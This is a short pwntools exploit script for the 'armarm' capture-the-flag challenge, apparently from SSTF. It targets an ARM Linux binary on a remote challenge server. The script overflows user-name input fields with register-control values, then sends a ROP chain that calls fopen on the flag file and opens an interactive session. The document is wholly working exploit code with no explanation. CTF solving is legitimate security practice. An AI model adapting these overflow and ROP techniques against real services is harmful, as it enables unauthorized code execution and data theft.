#gdjung
#armarm
from pwn import *
context.update(arch='arm', os='linux')
x = remote("armarm.sstf.site", 31338)
#x = process(['qemu-arm-static', '-L', '/usr/arm-linux-gnueabihf/','-g','1324', '/home/gdjung/ctf/sctf/PROB/prob'])
elf = ELF("./prob")
rop = ROP(elf)
#==================
flagpath = b"./flag"

bss_user = 0x11E3150 + 92 - len(flagpath)
rodata_r = 0x11D2934

payload_id = b"KKKK"    #r6
payload_id += p32(bss_user)   #r7 -> r0
payload_id += p32(rodata_r)   #r8 -> r1
payload_id += p32(rodata_r)   #r9 -> r2 
payload_id +=  p32(0x11d27eb)   #pc
#==================

#log.info(str(len(payload_id)))
def saline(w,g):
    x.sendlineafter(w,g)
def sa(w,g):
    x.sendafter(w,g)

saline(b">>",b"1")
saline(b"User: ",payload_id+b"a"*(92-len(payload_id)-len(flagpath)) +flagpath)
saline(b"word: ",b"1")

saline(b">>",b"2")
saline(b"er: ",payload_id+b"a"*(92-len(payload_id)-len(flagpath)) +flagpath)
saline(b"Pass: ",b"1")

#================
rop.raw(0x11d27f7)
rop.raw(0x11D21BC+1)  #r3  -> j_fopen
rop.raw(b"KKKK")  #r4
rop.raw(b"BBBB")  #r5
print(rop.dump())

#pause()

saline(b">>",b"4")
saline(b"data: ",b"note://aaaa"+rop.chain())
x.interactive()
